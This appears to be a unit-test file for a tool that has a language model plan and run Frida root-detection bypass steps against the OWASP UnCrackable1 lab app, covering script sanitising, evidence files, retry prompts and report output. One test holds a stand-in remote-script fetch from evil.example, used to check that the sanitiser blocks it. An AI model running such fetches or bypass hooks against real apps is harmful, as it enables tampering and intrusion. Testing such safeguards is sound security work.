"""Unit tests: Frida .js save/run wiring, retry feedback, Result/evidence refs."""

from __future__ import annotations

import os
import tempfile
import unittest
from unittest import mock

from webapp import exploit as exploit_mod
from webapp import exploit_grounding as g


def _uncrackable_loaded():
    return {
        "metadata": {
            "package": "owasp.mstg.uncrackable1",
            "app_name": "UnCrackable1",
            "version_name": "1.0",
        },
        "summary": {"level": "HIGH", "score": 40},
        "finding": {
            "rule_id": "ROOT_DETECTION",
            "title": "Root / tamper detection",
            "severity": "High",
            "evidence": "RootBeer / File.exists su path checks",
            "recommendation": "Do not rely on client root checks",
        },
        "findings": [],
    }


class FridaScriptSanitizeTests(unittest.TestCase):
    def test_sanitize_accepts_lab_hook_and_fills_package(self):
        raw = "Java.perform(function(){ console.log('pkg=' + 'PACKAGE'); });"
        clean, err = g.sanitize_frida_script(raw, "owasp.mstg.uncrackable1")
        self.assertIsNone(err)
        self.assertIn("owasp.mstg.uncrackable1", clean)
        self.assertNotIn("PACKAGE", clean)

    def test_sanitize_rejects_blocked_and_empty(self):
        self.assertEqual(g.sanitize_frida_script("", "x")[0], None)
        blocked, err = g.sanitize_frida_script(
            "fetch('https://evil.example/x.js')", "pkg"
        )
        self.assertIsNone(blocked)
        self.assertIn("safety", err.lower())


class FridaSaveRunWiringTests(unittest.TestCase):
    def test_save_frida_script_writes_evidence_file(self):
        with tempfile.TemporaryDirectory() as tmp:
            name, path, err = exploit_mod.save_frida_script(
                tmp,
                "Java.perform(function () { console.log('[bypass] ok'); });",
                package="owasp.mstg.uncrackable1",
            )
            self.assertIsNone(err)
            self.assertTrue(name.startswith("frida_") and name.endswith(".js"))
            self.assertTrue(os.path.isfile(path))
            with open(path, encoding="utf-8") as handle:
                body = handle.read()
            self.assertIn("[bypass]", body)

    def test_materialize_rewrites_dash_l_to_saved_path(self):
        with tempfile.TemporaryDirectory() as tmp:
            meta = exploit_mod.materialize_frida_step(
                {
                    "command": "frida -U -f PACKAGE -l script.js --no-pause",
                    "script": "console.log('secret is LAB');",
                },
                "owasp.mstg.uncrackable1",
                tmp,
            )
            self.assertIsNone(meta["error"])
            self.assertTrue(meta["script_filename"].endswith(".js"))
            self.assertIn(meta["script_path"], meta["command"])
            self.assertIn("owasp.mstg.uncrackable1", meta["command"])
            self.assertIn("--no-pause", meta["command"])

    def test_execute_steps_saves_script_and_stdout_evidence(self):
        with tempfile.TemporaryDirectory() as tmp:
            steps = [{
                "step": "Root bypass",
                "command": "frida -U -f owasp.mstg.uncrackable1 -l script.js --no-pause",
                "script": "console.log('Congratulations secret is lab');",
                "evidence": "text",
                "timeout": 20,
            }]

            def fake_run(serial, command, timeout=30):
                self.assertIn("frida", command)
                self.assertIn(tmp, command)
                return {
                    "command": command,
                    "stdout": "Congratulations secret is lab\n",
                    "stderr": "",
                    "returncode": 0,
                }

            with mock.patch.object(exploit_mod, "run_command", side_effect=fake_run):
                results, evidence = exploit_mod.execute_steps(
                    "emulator-5554",
                    "owasp.mstg.uncrackable1",
                    steps,
                    tmp,
                    finding=_uncrackable_loaded()["finding"],
                )
            self.assertEqual(len(results), 1)
            self.assertIn("Congratulations", results[0]["result_summary"])
            self.assertTrue(results[0].get("frida_script_file"))
            types = {ev.get("type") for ev in evidence}
            self.assertIn("frida_script", types)
            self.assertIn("frida_stdout", types)
            script_files = [
                ev["filename"] for ev in evidence if ev.get("type") == "frida_script"
            ]
            self.assertTrue(os.path.isfile(os.path.join(tmp, script_files[0])))


class RetryFeedbackTests(unittest.TestCase):
    def test_repair_rounds_constant_aligned(self):
        self.assertEqual(g.REPAIR_ROUNDS_PER_FINDING, 3)
        self.assertEqual(exploit_mod._MAX_REPAIR_ROUNDS, g.REPAIR_ROUNDS_PER_FINDING)

    def test_repair_prompt_includes_stderr_script_and_retry_budget(self):
        loaded = _uncrackable_loaded()
        steps = [{
            "step": "attach failed",
            "command": "frida -U owasp.mstg.uncrackable1 -l /tmp/x.js",
            "result_summary": "Error: unable to connect to remote frida-server",
            "raw": {
                "stdout": "",
                "stderr": "Failed to spawn: unable to find process",
                "returncode": 1,
            },
            "script": "console.log('[bypass] test');",
            "frida_script_file": "frida_01.js",
        }]
        evaluation = {
            "level": "UNCONFIRMED",
            "evidence_strength": "needs_manual_verification",
            "reasons": ["No expected proof tokens"],
            "matched_tokens": [],
        }
        prompt = g.repair_prompt(loaded, {"serial": "emu"}, steps, evaluation)
        self.assertIn("RETRY_BUDGET", prompt)
        self.assertIn("3 LLM repair rounds", prompt)
        self.assertIn("stderr=", prompt)
        self.assertIn("PRIOR FRIDA SCRIPTS", prompt)
        self.assertIn("frida_01.js", prompt)
        self.assertIn("frida_attach", prompt)
        self.assertIn("same/adjusted `script`", prompt)

    def test_micro_retry_rewrites_attach_to_spawn(self):
        loaded = _uncrackable_loaded()
        script = "console.log('[bypass] retry');"
        steps = [{
            "step": "attach",
            "command": "frida -U owasp.mstg.uncrackable1 -l frida_01.js",
            "result_summary": "Error: unable to attach: process not found",
            "script": script,
            "frida_script_file": "frida_01.js",
        }]
        micro = g.micro_retry_steps(loaded, steps)
        self.assertTrue(micro)
        self.assertTrue(any(" -f " in str(s.get("command") or "") for s in micro))
        self.assertTrue(any(s.get("script") == script for s in micro))
        self.assertFalse(
            any("FRIDA_COVERAGE_GAP" in str(s.get("command") or "") for s in micro)
        )

    def test_rewrite_attach_helper(self):
        rewritten = g.rewrite_frida_attach_to_spawn(
            "frida -U owasp.mstg.uncrackable1 -l script.js",
            "owasp.mstg.uncrackable1",
        )
        self.assertEqual(
            rewritten,
            "frida -U -f owasp.mstg.uncrackable1 -l script.js --no-pause",
        )
        self.assertIsNone(
            g.rewrite_frida_attach_to_spawn(
                "frida -U -f owasp.mstg.uncrackable1 -l script.js --no-pause",
                "owasp.mstg.uncrackable1",
            )
        )


class ResultEvidenceReportTests(unittest.TestCase):
    def test_result_status_and_summary_refs(self):
        evaluation = {
            "level": "CONFIRMED",
            "evidence_strength": "strong",
            "matched_tokens": ["secret is"],
            "reasons": [],
        }
        evidence = [
            {
                "type": "frida_script",
                "filename": "frida_01.js",
                "step": "bypass",
                "role": "proof",
            },
            {
                "type": "screenshot",
                "filename": "screenshot_01.png",
                "step": "post",
                "role": "post_proof",
            },
        ]
        result = g.build_result_summary(evaluation, evidence, [])
        self.assertEqual(result["status"], "success")
        self.assertIn("secret is", result["proof_sentence"])
        names = {ref["filename"] for ref in result["evidence_refs"]}
        self.assertIn("frida_01.js", names)
        self.assertIn("screenshot_01.png", names)
        md = g.format_result_markdown(result)
        self.assertIn("## Result", md)
        self.assertIn("success", md)
        self.assertIn("frida_01.js", md)

    def test_report_prompt_requires_result_heading(self):
        prompt = g.report_prompt(
            _uncrackable_loaded(),
            {"serial": "x", "model": "emu", "android_version": "9"},
            [],
            [{
                "type": "frida_script",
                "filename": "frida_01.js",
                "step": "hooks",
                "description": "saved",
                "role": "proof",
            }],
            {
                "level": "PARTIAL",
                "evidence_strength": "weak",
                "matched_tokens": ["bypass"],
                "reasons": ["partial"],
            },
        )
        self.assertIn("## Result", prompt)
        self.assertIn("RESULT_STATUS: partial", prompt)
        self.assertIn("frida_01.js", prompt)

    def test_pdf_html_includes_result_and_frida_artifact(self):
        with tempfile.TemporaryDirectory() as tmp:
            run_id = "exploitation_20990101_000001"
            run_dir = os.path.join(tmp, run_id)
            os.makedirs(run_dir)
            script_path = os.path.join(run_dir, "frida_01.js")
            with open(script_path, "w", encoding="utf-8") as handle:
                handle.write("console.log('[bypass] ok');\n")
            saved = {
                "created_at": "2099-01-01 00:00 UTC",
                "confirmation": "PARTIAL",
                "matched_tokens": ["bypass"],
                "gate_reasons": ["partial"],
                "result": {
                    "status": "partial",
                    "level": "PARTIAL",
                    "evidence_strength": "weak",
                    "proof_sentence": "Partial verification — matched bypass.",
                    "evidence_refs": [
                        {
                            "type": "frida_script",
                            "filename": "frida_01.js",
                            "step": "hooks",
                        }
                    ],
                },
                "report_html": (
                    "<h2>Executive Summary</h2><p>Dynamic verification: PARTIAL.</p>"
                    "<h2>Result</h2><p>partial</p>"
                ),
                "steps": [{
                    "step": "hooks",
                    "command": "frida -U -f owasp.mstg.uncrackable1 -l frida_01.js --no-pause",
                    "result_summary": "[bypass] ok",
                    "frida_script_file": "frida_01.js",
                }],
                "evidence": [{
                    "type": "frida_script",
                    "step": "hooks",
                    "filename": "frida_01.js",
                    "role": "proof",
                }],
            }
            loaded = _uncrackable_loaded()
            with mock.patch.object(exploit_mod, "EXPLOITS_DIR", tmp):
                document = exploit_mod._build_pdf_html(
                    loaded,
                    saved,
                    {"model": "emu", "android_version": "9", "serial": "x"},
                    run_id,
                )
            self.assertIn('id="result"', document)
            self.assertIn(">Result</h2>", document)
            self.assertIn("<b>partial</b>", document)
            self.assertIn("Partial verification", document)
            self.assertIn("frida_01.js", document)
            self.assertIn("Frida script — hooks", document)
            self.assertIn("console.log(", document)
            self.assertIn("[bypass] ok", document)
            self.assertIn('href="#result"', document)

    def test_sanitize_preserves_frida_script_field(self):
        finding = _uncrackable_loaded()["finding"]
        cleaned = g.sanitize_plan_steps(
            [{
                "step": "hooks",
                "command": "frida -U -f PACKAGE -l script.js --no-pause",
                "script": "console.log('[bypass] File.exists');\n",
                "evidence": "text",
                "why": "early root bypass",
            }],
            "owasp.mstg.uncrackable1",
            finding,
        )
        self.assertEqual(len(cleaned), 1)
        self.assertIn("script", cleaned[0])
        self.assertIn("[bypass]", cleaned[0]["script"])
        self.assertIn("owasp.mstg.uncrackable1", cleaned[0]["command"])

    def test_root_bypass_baseline_includes_script(self):
        steps = g.finding_baseline_steps(_uncrackable_loaded())
        frida_steps = [s for s in steps if str(s.get("command") or "").startswith("frida")]
        self.assertTrue(frida_steps)
        self.assertIn("script", frida_steps[0])
        self.assertIn("RootBeer", frida_steps[0]["script"])


class SoftLimitsStillHoldTests(unittest.TestCase):
    def test_soft_limits_unchanged(self):
        self.assertEqual(g._SOFT_MAX_STEPS, 6)
        self.assertEqual(g._SOFT_MAX_SCREENSHOTS, 2)
        plan = g.exploit_system_prompt("plan")
        self.assertIn("soft max 6", plan.lower())
        self.assertIn("soft max 2 screenshots", plan.lower())


if __name__ == "__main__":
    unittest.main()
